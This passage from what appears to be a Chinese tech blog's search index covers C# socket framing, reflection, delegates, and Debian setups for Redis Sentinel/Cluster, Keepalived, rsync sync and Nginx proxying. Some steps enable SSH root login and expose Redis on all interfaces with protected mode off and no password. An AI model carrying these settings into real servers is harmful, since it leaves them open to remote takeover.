stream.Close(); client.Close(); Console.WriteLine(\u0026#34;Disconnected from server.\u0026#34;); } } 包头 使用 BitConverter.GetBytes(int) 将包体长度转换为 4 字节的字节数组。 这样，服务端可以根据包头解析出包体的长度，确保不会漏读或多读数据。\n包体 实际的消息内容（字符串）被编码为字节数组 bodyBuffer。\n组合包头和包体 使用 Buffer.BlockCopy 将包头和包体拼接成一个完整的数据包，按照以下格式发送：\n[包头 (4字节)][包体 (N字节)] 发送逻辑 调用 stream.Write 将整个数据包发送到服务端。即使多次发送，服务端依然能够正确解析每个数据包的内容。\n运行结果 假设服务端按照之前的代码实现分包逻辑（先读包头，再根据长度读包体），运行客户端和服务端后，输出类似以下结果：\n服务端输出\nServer started, waiting for connection... Client connected! Received Message: Hello, Server! Received Message: This is a test. Received Message: Goodbye! 客户端输出\nConnected to server. Sent: Hello, Server! Sent: This is a test. Sent: Goodbye! Disconnected from server. 这种方式可以避免使用分隔符（如 |）时可能产生的冲突问题，常用于传输二进制数据和更复杂的协议通信。\n","permalink":"https://qfsyso.github.io/posts/packet-splicing/","summary":"模拟粘包的场景 粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。\n使用固定分隔符或包头+包体 常见的解决粘包方案是使用分隔符（如 \\n 或特殊字符），或采用固定的包头标识数据长度。\n服务端代码\nusing System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class TcpServer { static void Main() { TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(\u0026#34;Server started, waiting for connection...\u0026#34;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(\u0026#34;Client connected!\u0026#34;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) \u0026gt; 0) { string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($\u0026#34;Received: {receivedData}\u0026#34;); // 模拟数据未分包的场景 Console.WriteLine(\u0026#34;Processing received data...\u0026#34;); string[] messages = receivedData.","title":"packet splicing"},{"content":"Reflection 反射 动态加载和创建对象： 反射可以在运行时加载程序集，并基于类型信息创建对象实例，而无需在编译时知道具体的类型。 这对于实现插件系统、动态加载模块或在不同版本的库之间提供兼容性非常有用。\n反射可以获取有关类型（如类、接口、结构体等）及其成员（如字段、属性、方法等）的详细信息。 这对于生成文档、进行代码分析或创建序列化/反序列化机制等任务非常有用。\nclass Program { static void Main(string[] args) { // 加载包含类型的程序集 Assembly assembly = Assembly.LoadFrom(\u0026#34;ReflectionExample.dll\u0026#34;); // 获取类型信息 Type type = assembly.GetType(\u0026#34;ReflectionExample.MyClass\u0026#34;); // 创建对象实例 object instance = Activator.CreateInstance(type); // 获取方法信息 MethodInfo methodInfo = type.GetMethod(\u0026#34;MyMethod\u0026#34;); // 调用方法 methodInfo.Invoke(instance, new object[] { \u0026#34;Hello, Reflection!\u0026#34; }); } } public class MyClass { public void MyMethod(string message) { Console.WriteLine(message); } } Delegate 委托 委托是一种类型安全的函数指针，可以用来引用一个或多个具有相同签名的方法。 委托（Delegate）是一种特殊的类型，它代表对具有特定参数列表和返回类型的函数的引用。委托可以用来封装静态方法或实例方法，并且可以在运行时像普通变量一样传递。这使得委托成为一种强大的工具，用于实现回调函数、事件处理以及其他需要函数作为参数传递的场景。\n委托的基本特性 类型安全：委托是类型安全的，因为它们在声明时会指定一个方法签名，只有与这个签名匹配的方法才能被委托引用。 多播能力：大多数委托支持多播，即一个委托实例可以引用多个方法。当调用该委托时，所有引用的方法都会被依次调用。 灵活性：委托可以用来引用类的实例方法或静态方法，也可以引用匿名方法（使用lambda表达式）。 定义委托 委托可以通过delegate关键字定义。定义时需要指定返回类型和参数列表。 有访问修饰符，delegate，返回值类型，委托名称，参数-可选。可以在类内部，可以在外部。\n本质 底层是个特殊类(强类型)， 继承运行时的MulticastDelegate\npublic delegate void MyDelegate(string message); // 返回类型为void，接受一个字符串参数 ``` 使用委托 创建委托实例 可以通过委托的构造函数或者new关键字创建委托实例，并将它绑定到具体的方法上。 ```Csharp public class MyClass { public void MyMethod(string message) { Console.WriteLine(message); } } public class Program { public static void StaticMethod(string message) { Console.WriteLine(\u0026#34;Static: \u0026#34; + message); } public static void Main() { MyClass instance = new MyClass(); MyDelegate del1 = new MyDelegate(instance.MyMethod); MyDelegate del2 = new MyDelegate(StaticMethod); // 调用委托 del1(\u0026#34;Hello from instance method\u0026#34;); del2(\u0026#34;Hello from static method\u0026#34;); } } ``` 多播委托 如果 定义的委托不是void返回类型，那么当委托指向多个方法时，只有最后一个方法的返回值会被返回。对于返回类型为void的委托，所有方法都会被执行。 ```Csharp public class Program { public static void Method1(string message) { Console.WriteLine(\u0026#34;Method1: \u0026#34; + message); } public static void Method2(string message) { Console.WriteLine(\u0026#34;Method2: \u0026#34; + message); } public static void Main() { MyDelegate del1 = new MyDelegate(Method1); MyDelegate del2 = new MyDelegate(Method2); MyDelegate combined = del1 + del2; // 组合两个委托 combined(\u0026#34;Hello multi-cast delegate\u0026#34;); // 调用组合后的委托 } } ``` 使用Lambda表达式 从C# 3.0开始， 可以使用lambda表达式来创建委托，这使得代码更加简洁。 ```Csharp public class Program { public static void Main() { MyDelegate del = message =\u0026gt; Console.WriteLine(\u0026#34;Lambda: \u0026#34; + message); del(\u0026#34;Hello lambda expression\u0026#34;); } } ``` ## 参数传递委托 ```csharp namespace ConsoleApp1T1 { public delegate void NoReOutClass(); public class MyDele { public delegate void NoReP(); public delegate void NoRePn(int x, int y); public delegate int WithReP(); public delegate int WithRePn(int x,ref int y); public void show() { //NoReP mh1 = new NoReP(DoNothing); NoReP methodhander1 = DoNothing;//语法糖 //methodhander1.Invoke();//执行委托 //old dotnet ver BeginInvoke //本质是类的实例 可以做为参数传递 ExDele(methodhander1);//类似容器 把一段函数-业务逻辑 传递到不同的地方 ////使用 // MyDele myDele = new MyDele(); // myDele.show(); } public void ExDele(NoReP de) { de.Invoke(); } public void DoNothing() { Console.WriteLine(\u0026#34;do nothing\u0026#34;); } public void DoObj() { Console.WriteLine(\u0026#34;do obj\u0026#34;); } } } ``` ## 通用的 TryCatchWrapper 函数 通用的静态工具方法，让它接收一个 Func\u0026lt;T\u0026gt; 委托，然后内部执行 try-catch： ```csharp // public static class TryCatchHelper { public static T TryCatch\u0026lt;T\u0026gt;(Func\u0026lt;T\u0026gt; func, T defaultValue = default) { try { return func(); } catch (Exception ex) { Console.WriteLine(ex.Message); return defaultValue; } } } ``` 调用方式： ```csharp int rsint = TryCatchHelper.TryCatch(() =\u0026gt; mq.UpdateIMUserStrCk(strid)); //也可以设置默认值： int rsint = TryCatchHelper.TryCatch(() =\u0026gt; mq.UpdateIMUserStrCk(strid), -1); ``` ## TryCatchWrapper void ```csharp public static class TryCatchHelper { public static void TryCatch5(Action action) { try { action(); } catch (Exception ex) { Console.WriteLine(ex.Message); } } } ``` ✅ 使用方式： ```csharp TryCatchHelper.TryCatch5(() =\u0026gt; Serializer.Serialize(stream, iMMsgSK)); ``` 这样就能像写一行函数那样调用，并自动处理异常。 # 事件 事件是基于订阅-发布模式的一种机制，用于实现对象之间的解耦。 ```Csharp public class Publisher { public event EventHandler CustomEvent; protected virtual void OnCustomEvent(EventArgs e) { CustomEvent?.Invoke(this, e); } public void TriggerEvent() { OnCustomEvent(EventArgs.Empty); } } public class Subscriber { public void OnCustomEvent(object sender, EventArgs e) { Console.WriteLine(\u0026#34;Event received.\u0026#34;); } } public class Program { public static void Main() { Publisher publisher = new Publisher(); Subscriber subscriber = new Subscriber(); publisher.CustomEvent += subscriber.OnCustomEvent; publisher.TriggerEvent(); } } ``` 在 .NET 中，事件是一种特殊的委托类型（委托的一个变量），用于实现发布-订阅模式。事件允许一个对象（发布者）通知其他对象（订阅者）发生了某些事情。下面是一个简单的 .NET 事件的例子，我们将创建一个简单的计数器类 Counter，当计数达到特定值时触发事件。 定义事件 首先，我们需要定义一个事件处理器委托，然后在 Counter 类中声明一个事件。 ```Csharp using System; // 定义一个事件处理程序委托 public delegate void ReachedEventHandler(object source, EventArgs e); // 计数器类 public class Counter { // 定义一个事件 public event ReachedEventHandler Reached; private int _count; // 增加计数的方法 public void Increment() { _count++; Console.WriteLine($\u0026#34;Count is now {_count}\u0026#34;); // 当计数达到某个值时触发事件 if (_count \u0026gt;= 5) { OnReached(); } } // 触发事件的方法 protected virtual void OnReached() { Reached?.Invoke(this, EventArgs.Empty); } } ``` 使用事件 接下来，我们将在主程序中创建 Counter 类的实例，并订阅其 Reached 事件。 ```Csharp class Program { static void Main(string[] args) { var counter = new Counter(); // 订阅事件 counter.Reached += Counter_Reached; // 模拟增加计数 for (int i = 0; i \u0026lt; 6; i++) { counter.Increment(); } } // 事件处理方法 private static void Counter_Reached(object source, EventArgs e) { Console.WriteLine(\u0026#34;The count has reached the limit!\u0026#34;); } } ``` 在这个例子中，每当计数器的值达到5时，就会触发 Reached 事件。订阅了此事件的对象将接收到通知，并可以执行相应的操作。在这个例子中，我们的主程序订阅了这个事件，并定义了一个事件处理方法 Counter_Reached，该方法会在事件被触发时输出一条消息。 这是一个非常基础的示例，实际应用中事件可以携带更多的信息，例如通过自定义的事件参数类来传递数据给事件处理方法。 # 泛型 泛型允许 在定义方法、类或接口时不指定具体的类型，而是在使用的时候再指定。这样可以提高代码的复用性和类型安全性。 ```Csharp public class Box\u0026lt;T\u0026gt; { private T item; public Box(T item) { this.item = item; } public T GetItem() { return item; } } // 使用示例 Box\u0026lt;string\u0026gt; stringBox = new Box\u0026lt;string\u0026gt;(\u0026#34;Hello World\u0026#34;); string content = stringBox.GetItem(); Console.WriteLine(content); ``` ","permalink":"https://qfsyso.github.io/posts/csharp-reflection-delegate/","summary":"Reflection 反射 动态加载和创建对象： 反射可以在运行时加载程序集，并基于类型信息创建对象实例，而无需在编译时知道具体的类型。 这对于实现插件系统、动态加载模块或在不同版本的库之间提供兼容性非常有用。\n反射可以获取有关类型（如类、接口、结构体等）及其成员（如字段、属性、方法等）的详细信息。 这对于生成文档、进行代码分析或创建序列化/反序列化机制等任务非常有用。\nclass Program { static void Main(string[] args) { // 加载包含类型的程序集 Assembly assembly = Assembly.LoadFrom(\u0026#34;ReflectionExample.dll\u0026#34;); // 获取类型信息 Type type = assembly.GetType(\u0026#34;ReflectionExample.MyClass\u0026#34;); // 创建对象实例 object instance = Activator.CreateInstance(type); // 获取方法信息 MethodInfo methodInfo = type.GetMethod(\u0026#34;MyMethod\u0026#34;); // 调用方法 methodInfo.Invoke(instance, new object[] { \u0026#34;Hello, Reflection!\u0026#34; }); } } public class MyClass { public void MyMethod(string message) { Console.WriteLine(message); } } Delegate 委托 委托是一种类型安全的函数指针，可以用来引用一个或多个具有相同签名的方法。 委托（Delegate）是一种特殊的类型，它代表对具有特定参数列表和返回类型的函数的引用。委托可以用来封装静态方法或实例方法，并且可以在运行时像普通变量一样传递。这使得委托成为一种强大的工具，用于实现回调函数、事件处理以及其他需要函数作为参数传递的场景。\n委托的基本特性 类型安全：委托是类型安全的，因为它们在声明时会指定一个方法签名，只有与这个签名匹配的方法才能被委托引用。 多播能力：大多数委托支持多播，即一个委托实例可以引用多个方法。当调用该委托时，所有引用的方法都会被依次调用。 灵活性：委托可以用来引用类的实例方法或静态方法，也可以引用匿名方法（使用lambda表达式）。 定义委托 委托可以通过delegate关键字定义。定义时需要指定返回类型和参数列表。 有访问修饰符，delegate，返回值类型，委托名称，参数-可选。可以在类内部，可以在外部。","title":"csharp reflection delegate"},{"content":"Debian 服务器上部署分布式 Redis 可以实现高可用性或负载均衡，具体可以选择以下两种方案之一：\n主从复制 (Master-Slave Replication) 主从复制用于数据冗余备份和读写分离，但并不提供自动故障切换功能。\nRedis Sentinel (哨兵模式) Redis Sentinel 在主从复制的基础上增加了自动故障切换功能，用于实现高可用性。\nRedis Cluster (集群模式) Redis Cluster 是一种分布式部署方式，支持数据分片和高可用性，适用于需要扩展性的场景。\nRedis Sentinel 部署架构 两台服务器： 主 Redis 服务器（假设 IP：192.168.1.101） 从 Redis 服务器（假设 IP：192.168.1.102） Sentinel 哨兵进程： 每台服务器运行一个 Sentinel 进程，用于监控和故障切换。\n步骤 1：安装 Redis 在两台服务器上分别安装 Redis：\nsudo apt update sudo apt install redis-server 验证 Redis 版本：\nredis-server --version 步骤 2：配置 Redis 主从复制 在主服务器 (192.168.1.101) 上 编辑 Redis 配置文件 /etc/redis/redis.conf：\nbind 0.0.0.0 # 允许外部访问 protected-mode no # 关闭保护模式（测试环境使用） appendonly yes # 开启持久化 启动 Redis 服务：\nsudo systemctl restart redis 在从服务器 (192.168.1.102) 上 编辑 Redis 配置文件 /etc/redis/redis.conf：\nbind 0.0.0.0 protected-mode no appendonly yes # 设置为主服务器的从节点 replicaof 192.168.1.101 6379 启动 Redis 服务：\nsudo systemctl restart redis 验证主从复制 在主服务器上设置一个测试键：\nredis-cli set mykey \u0026#34;hello_redis\u0026#34; 在从服务器上读取：\nredis-cli get mykey # 返回 \u0026#34;hello_redis\u0026#34; 步骤 3：配置 Redis Sentinel 在两台服务器上配置 Redis Sentinel。Redis 自带 Sentinel 二进制文件，不需要额外安装。\n配置主服务器的 Sentinel 编辑 /etc/redis/sentinel.conf：\nbind 0.0.0.0 # 允许外部访问 protected-mode no # 关闭保护模式（测试环境使用） # 监控主节点，设置 quorum 为 2 sentinel monitor mymaster 192.168.1.101 6379 2 # 如果主节点在 5 秒内无响应，则认为其失效 sentinel down-after-milliseconds mymaster 5000 # 设置故障切换的超时时间 sentinel failover-timeout mymaster 10000 # 如果主节点有密码，需添加以下配置 # sentinel auth-pass mymaster \u0026lt;password\u0026gt; 配置从服务器的 Sentinel 在从服务器上，配置 /etc/redis/sentinel.conf，内容与主服务器一致。\n步骤 4：启动 Redis Sentinel 在两台服务器上启动 Sentinel：\nredis-server /etc/redis/sentinel.conf --sentinel 检查是否启动成功：\nps aux | grep redis 应该能看到 Redis Sentinel 进程运行。\n步骤 5：测试高可用性 模拟主节点故障 在主服务器上停止 Redis 服务：\nsudo systemctl stop redis Sentinel 检测到主节点不可用后，会自动将从节点（192.168.1.102）提升为主节点。\n验证故障切换 在 Sentinel 中查看新的主节点：\nredis-cli -p 26379 SENTINEL get-master-addr-by-name mymaster 应返回从节点的 IP 和端口（192.168.1.102:6379）。\n恢复主节点 启动主节点服务：\nsudo systemctl start redis 主节点会自动成为新的从节点，重新加入集群。\n附加：常用命令 查看 Sentinel 监控的所有节点：\nredis-cli -p 26379 SENTINEL masters 查看特定主节点的所有从节点：\nredis-cli -p 26379 SENTINEL slaves mymaster 手动触发故障切换：\nredis-cli -p 26379 SENTINEL failover mymaster 部署总结 Redis Sentinel 实现了主从复制的监控和自动故障切换，其核心是：\n主节点负责写操作，从节点提供读操作。 Sentinel 检测主节点是否不可用，并自动将从节点提升为主节点。 整个系统实现了高可用性，无需人工干预。\n三台服务器\n假设有三台服务器：\n主节点（Master）：192.168.1.101 从节点1（Replica1）：192.168.1.102 从节点2（Replica2）：192.168.1.103 每台服务器同时运行 Redis 和 Sentinel。\n1. 安装 Redis 在所有服务器上安装 Redis：\nsudo apt update sudo apt install redis-server 验证 Redis 安装：\nredis-server --version 2. 配置主从复制 主节点配置（192.168.1.101） 编辑 /etc/redis/redis.conf：\nbind 0.0.0.0 protected-mode no appendonly yes 启动 Redis 主节点：\nsudo systemctl restart redis 从节点配置（192.168.1.102 和 192.168.1.103） 编辑 /etc/redis/redis.conf：\nbind 0.0.0.0 protected-mode no appendonly yes # 配置为从节点，指向主节点 IP 和端口 replicaof 192.168.1.101 6379 启动 Redis 从节点：\nsudo systemctl restart redis 验证主从同步 在主节点上插入数据：\nredis-cli SET test_key \u0026#34;hello_redis\u0026#34; 在从节点验证：\nredis-cli GET test_key # 应返回 \u0026#34;hello_redis\u0026#34; 3. 配置 Sentinel 配置文件路径 默认 Sentinel 配置文件路径为 /etc/redis/sentinel.conf。\n编辑 Sentinel 配置文件 在所有服务器（192.168.1.101、192.168.1.102、192.168.1.103）上，编辑 /etc/redis/sentinel.conf：\nbind 0.0.0.0 protected-mode no # 定义监控的主节点名称和地址 sentinel monitor mymaster 192.168.1.101 6379 2 # 配置检测主节点失败的时间（毫秒） sentinel down-after-milliseconds mymaster 5000 # 配置故障转移完成的超时时间（毫秒） sentinel failover-timeout mymaster 10000 # 如果启用了密码认证，请设置主节点密码 # sentinel auth-pass mymaster \u0026lt;的密码\u0026gt; 启动 Sentinel 在每台服务器上分别启动 Sentinel：\nredis-server /etc/redis/sentinel.conf --sentinel 4. 验证 Sentinel 查看 Sentinel 状态 在任意 Sentinel 节点执行以下命令：\nredis-cli -p 26379 SENTINEL masters 输出应显示主节点的信息，例如：\nname: mymaster, status: ok, slaves: 2\n模拟故障转移 手动停止主节点服务：\nsudo systemctl stop redis Sentinel 将检测主节点不可用，并自动提升从节点为主节点。 验证新的主节点：\nredis-cli -p 26379 SENTINEL get-master-addr-by-name mymaster 新主节点的 IP 和端口将被返回。\n5. 高可用性测试 在新主节点上插入数据：\nredis-cli -h \u0026lt;新主节点IP\u0026gt; SET test_key2 \u0026#34;new_data\u0026#34; 验证数据是否同步到从节点：\nredis-cli -h \u0026lt;从节点IP\u0026gt; GET test_key2 总结 通过 Redis Sentinel，可以实现：\n自动故障检测：当主节点不可用时，Sentinel 会自动检测并进行切换。 自动主从切换：从节点自动提升为主节点，保障服务持续可用。 无需人工干预：服务的高可用性大大提高。 如需进一步调整配置（如增加节点或优化参数），可根据具体业务需求进行调整。\nRedis Cluster 步骤一：安装Redis 在每台服务器上安装Redis。\nsudo apt update sudo apt install redis-server 步骤二：配置Redis 备份原始配置文件：\nsudo cp /etc/redis/redis.conf /etc/redis/redis.conf.bak 编辑Redis配置文件： 编辑 /etc/redis/redis.conf 文件，进行以下修改： 启用集群模式：\ncluster-enabled yes 指定集群配置文件：\ncluster-config-file nodes-6379.conf 设置节点超时时间： cluster-node-timeout 5000 启用AOF持久化（可选，但推荐）： appendonly yes 绑定服务器的IP地址： 将 bind 127.0.0.1 修改为服务器的实际IP地址，例如： bind 192.168.1.1 设置监听端口： 默认端口是6379，确保每个节点的端口不同。例如，第一台服务器保持6379，第二台服务器可以设置为6380，第三台服务器可以设置为6381。\n步骤三：启动Redis服务 在每台服务器上启动Redis服务：\nsudo systemctl restart redis-server 步骤四：创建Redis集群 下载Redis工具： 如果你还没有安装Redis的命令行工具，可以从官方GitHub仓库下载最新的Redis版本，解压后找到 redis-trib.rb 脚本。 创建集群： 使用 redis-cli 工具来创建集群。假设你的三台服务器的IP地址分别为 192.168.1.1、192.168.1.2 和 192.168.1.3，且Redis实例分别监听6379、6380和6381端口，命令如下：\nredis-cli --cluster create 192.168.1.1:6379 192.168.1.2:6380 192.168.1.3:6381 --cluster-replicas 1 这里 \u0026ndash;cluster-replicas 1 表示每个主节点有一个副本。\n步骤五：验证集群 连接到任意一个节点：\nredis-cli -h 192.168.1.1 -p 6379 执行基本命令：\nset testkey \u0026#34;Hello Redis Cluster\u0026#34; get testkey 检查集群状态：\ncluster nodes 步骤六：监控和维护 定期检查日志： 查看 /var/log/redis/redis-server.log 文件中的日志信息，确保没有错误。 监控性能： 使用 redis-cli 的 info 命令来监控集群的性能和状态：\nredis-cli -h 192.168.1.1 -p 6379 info Debian root登录 echo \u0026#39;PermitRootLogin yes\u0026#39; \u0026gt;\u0026gt; /etc/ssh/sshd_config # 重启ssh服务，使配置生效 sudo systemctl restart ssh debian 更换源 1. 备份文件 cp /etc/apt/sources.list /etc/apt/sources.list.bak\n2. 更改 sources.list文件内容为： (官方源) deb http://deb.debian.org/debian bullseye main contrib non-free deb-src http://deb.debian.org/debian bullseye main contrib non-free\n3. 更新 apt-get -y update\n","permalink":"https://qfsyso.github.io/posts/redis-sentinel-cluster/","summary":"Debian 服务器上部署分布式 Redis 可以实现高可用性或负载均衡，具体可以选择以下两种方案之一：\n主从复制 (Master-Slave Replication) 主从复制用于数据冗余备份和读写分离，但并不提供自动故障切换功能。\nRedis Sentinel (哨兵模式) Redis Sentinel 在主从复制的基础上增加了自动故障切换功能，用于实现高可用性。\nRedis Cluster (集群模式) Redis Cluster 是一种分布式部署方式，支持数据分片和高可用性，适用于需要扩展性的场景。\nRedis Sentinel 部署架构 两台服务器： 主 Redis 服务器（假设 IP：192.168.1.101） 从 Redis 服务器（假设 IP：192.168.1.102） Sentinel 哨兵进程： 每台服务器运行一个 Sentinel 进程，用于监控和故障切换。\n步骤 1：安装 Redis 在两台服务器上分别安装 Redis：\nsudo apt update sudo apt install redis-server 验证 Redis 版本：\nredis-server --version 步骤 2：配置 Redis 主从复制 在主服务器 (192.168.1.101) 上 编辑 Redis 配置文件 /etc/redis/redis.conf：\nbind 0.0.0.0 # 允许外部访问 protected-mode no # 关闭保护模式（测试环境使用） appendonly yes # 开启持久化 启动 Redis 服务：","title":"redis sentinel cluster"},{"content":"Keepalived 是一种用于实现高可用性的工具，它通过VRRP（虚拟路由冗余协议）来管理虚拟IP地址，从而确保在主服务器故障时，备用服务器能够接管服务。\n环境准备 假设有两台Debian服务器：\nServer 1 (Master): IP地址 192.168.1.100 Server 2 (Backup): IP地址 192.168.1.101 虚拟IP地址: 192.168.1.102\n步骤一：安装Nginx 在两台服务器上安装Nginx。\nServer 1 (Master)\nsudo apt update sudo apt install nginx Server 2 (Backup)\nsudo apt update sudo apt install nginx 步骤二：安装Keepalived 在两台服务器上安装Keepalived。\nServer 1 (Master)\nsudo apt install keepalived Server 2 (Backup) ```Bash sudo apt install keepalived 步骤三：配置Keepalived 编辑Keepalived的配置文件 /etc/keepalived/keepalived.conf。\nServer 1 (Master)\nsudo nano /etc/keepalived/keepalived.conf 添加以下配置：\nvrrp_instance VI_1 { state MASTER interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.102 } } Server 2 (Backup)\nsudo nano /etc/keepalived/keepalived.conf 添加以下配置：\nvrrp_instance VI_1 { state BACKUP interface eth0 virtual_router_id 51 priority 90 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.102 } } 步骤四：启动Keepalived 启动并启用Keepalived服务。\nServer 1 (Master)\nsudo systemctl start keepalived sudo systemctl enable keepalived Server 2 (Backup)\nsudo systemctl start keepalived sudo systemctl enable keepalived 步骤五：配置Nginx 确保两台服务器上的Nginx配置相同。编辑Nginx配置文件 /etc/nginx/sites-available/default。\nNginx\nserver { listen 80; server_name your_domain_or_ip; location / { proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 步骤六：测试配置 测试Nginx配置文件是否正确无误：\nsudo nginx -t 重新加载Nginx以使更改生效：\nsudo systemctl reload nginx 步骤七：验证高可用性 访问虚拟IP地址: 使用浏览器或其他工具访问虚拟IP地址 192.168.1.102，确保Nginx服务正常工作。 模拟故障: 关闭主服务器上的Nginx服务或Keepalived服务，观察备用服务器是否接管虚拟IP地址。\nsudo systemctl stop nginx sudo systemctl stop keepalived 检查状态: 在备用服务器上检查虚拟IP地址是否已经接管：\nip addr show eth0 步骤八：日志和监控 查看Keepalived的日志以确保没有错误：\nsudo tail -f /var/log/syslog 通过以上步骤，可以在两台Debian服务器上成功部署Keepalived实现高可用Nginx。 这样，即使主服务器发生故障，备用服务器也会自动接管服务，确保系统的高可用性和稳定性。\n不同虚拟IP地址的高可用性： 跨云服务商\n1. 使用DNS轮询 通过DNS轮询（Round Robin DNS）来实现负载均衡和高可用性。\n步骤： 如 example.com。 配置DNS记录: 在DNS管理面板中，为的域名配置两个A记录，分别指向两个云服务商的IP地址。\nexample.com. A 192.168.1.100 (阿里云IP) example.com. A 192.168.1.101 (腾讯云IP) 客户端访问: 当客户端访问 example.com 时，DNS服务器会轮流返回两个IP地址之一，实现负载均衡。 健康检查: 可以使用DNS提供商的健康检查功能，自动将流量切换到健康的服务器。\n2. 使用全局负载均衡器 一些云服务商提供了全局负载均衡器（Global Load Balancer），可以跨区域和跨服务商实现高可用性。\nnginx 配置文件的同步 使用 inotify 和 rsync 实现两个 Debian 服务器之间的数据实时同步是一个常见且有效的方法。 inotify 可以监控文件系统的变更事件，而 rsync 则负责实际的数据同步。以下是详细的步骤：\n环境准备 Server 1 (Master): IP地址 192.168.1.100 Server 2 (Backup): IP地址 192.168.1.101\n步骤一：安装必要的软件 在两台服务器上安装 rsync 和 inotify-tools。\nServer 1 (Master)\nsudo apt update sudo apt install rsync inotify-tools Server 2 (Backup)\nsudo apt update sudo apt install rsync 步骤二：配置 SSH 密钥免密登录 为了简化 rsync 的操作，建议配置从主服务器到备份服务器的 SSH 密钥免密登录。\n在主服务器上生成 SSH 密钥\nssh-keygen -t rsa -b 4096 按提示操作，默认保存路径即可。\n将公钥复制到备份服务器\nssh-copy-id user@192.168.1.101 步骤三：编写同步脚本 在主服务器上编写一个脚本，使用 inotifywait 监控文件系统的变更事件，并调用 rsync 进行同步。\n创建同步脚本\nnano /usr/local/bin/inotify_sync.sh 添加以下内容：\n#!/bin/bash # 监控的目录 WATCH_DIR=\u0026#34;/path/to/sync\u0026#34; # 备份服务器的IP地址和目标目录 REMOTE_USER=\u0026#34;user\u0026#34; REMOTE_HOST=\u0026#34;192.168.1.101\u0026#34; REMOTE_DIR=\u0026#34;/path/to/sync\u0026#34; # 使用 inotifywait 监控目录变化 inotifywait -m -r -e modify,create,delete,move \u0026#34;$WATCH_DIR\u0026#34; | while read path action file; do echo \u0026#34;Change detected: $action $file on $path\u0026#34; # 使用 rsync 同步文件 rsync -avz --delete --exclude \u0026#39;.git\u0026#39; --exclude \u0026#39;.DS_Store\u0026#39; \u0026#34;$WATCH_DIR/\u0026#34; \u0026#34;$REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR/\u0026#34; done 赋予脚本执行权限\nchmod +x /usr/local/bin/inotify_sync.sh 步骤四：启动同步脚本 可以手动启动脚本，或者将其添加到 systemd 服务中以确保其在后台持续运行。\n手动启动\nnohup /usr/local/bin/inotify_sync.sh \u0026amp; 创建 systemd 服务 启动 创建服务文件\nsudo nano /etc/systemd/system/inotify_sync.service 添加以下内容：\nIni [Unit] Description=Inotify Sync Service After=network.target [Service] User=root ExecStart=/usr/local/bin/inotify_sync.sh Restart=always [Install] WantedBy=multi-user.target 启动并启用服务\nsudo systemctl daemon-reload sudo systemctl start inotify_sync.service sudo systemctl enable inotify_sync.service 步骤五：验证同步 在主服务器上创建或修改文件:\necho \u0026#34;Test content\u0026#34; \u0026gt; /path/to/sync/testfile.txt 在备份服务器上检查文件:\nls /path/to/sync/ cat /path/to/sync/testfile.txt 注意事项 性能考虑: inotify 会消耗一定的系统资源，特别是在监控大量文件时。确保的服务器有足够的资源来处理这些事件。 可以通过排除不必要的文件或目录（如 .git、.DS_Store）来减少不必要的同步操作。 安全考虑: 确保 SSH 密钥的安全性，避免泄露。 可以使用更严格的 SSH 配置，例如限制密钥的使用范围和有效期。 通过以上步骤，可以在两台 Debian 服务器之间使用 inotify 和 rsync 实现实时数据同步。\nnginx 反代 在Debian系统上安装Nginx并配置反向代理到特定的IP地址和端口\n1. 更新软件包列表 首先，确保软件包列表是最新的。打开终端并执行：\nsudo apt update 2. 安装Nginx sudo apt install nginx . 配置Nginx作为反向代理 安装完成后，需要编辑Nginx的配置文件来设置反向代理。默认情况下，Nginx的配置文件位于/etc/nginx/sites-available/default。\n使用喜欢的文本编辑器（如nano或vim）打开此文件：\nsudo nano /etc/nginx/sites-available/default 在文件中找到server块，并添加或修改如下配置以设置反向代理。假设要将所有请求代理到192.168.1.100:8080：\nNginx server { listen 80; server_name your_domain_or_ip; location / { proxy_pass http://192.168.1.100:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } listen 80; 指定了Nginx监听的端口号，这里使用的是80端口，即HTTP服务的标准端口。 server_name 应该替换为域名或服务器的公网IP地址。 proxy_pass 指令用于指定要代理的目标服务器的URL。 proxy_set_header 指令用于设置转发给后端服务器的请求头信息。 4. 测试配置文件 在保存并退出编辑器之后，测试Nginx配置是否正确无误：\nsudo nginx -t 如果输出显示语法正确且测试成功，可以继续下一步。\n5. 重新加载Nginx 使更改生效，需要重新加载Nginx服务：\nsudo systemctl reload nginx 6. 验证反向代理工作情况 现在，可以通过浏览器访问域名或服务器的公网IP地址，看看是否能够正确地将请求代理到192.168.1.100:8080。\n如果遇到任何问题，可以查看Nginx的日志文件来诊断问题。错误日志通常位于/var/log/nginx/error.log。\nNginx中配置多个反向代理目标 可以使用upstream模块来定义一个负载均衡池。 Nginx可以根据配置的策略（例如轮询、最少连接等）将请求分发到不同的后端服务器。\n以下是具体步骤：\n1. 编辑Nginx配置文件 打开Nginx的配置文件：\nsudo nano /etc/nginx/sites-available/default 2. 添加upstream块 在配置文件的顶部或适当位置添加一个upstream块，定义后端服务器池：\nNginx upstream backend_servers { server 192.168.1.100:8080; server 192.168.1.101:8081; } 3. 修改server块 在server块中，将proxy_pass指令指向刚刚定义的upstream块：\nNginx server { listen 80; server_name your_domain_or_ip; location / { proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 4. 测试配置文件 保存并退出编辑器后，测试Nginx配置是否正确无误：\nsudo nginx -t 5. 重新加载Nginx 如果测试成功，重新加载Nginx以使更改生效：\nsudo systemctl reload nginx 6. 验证配置 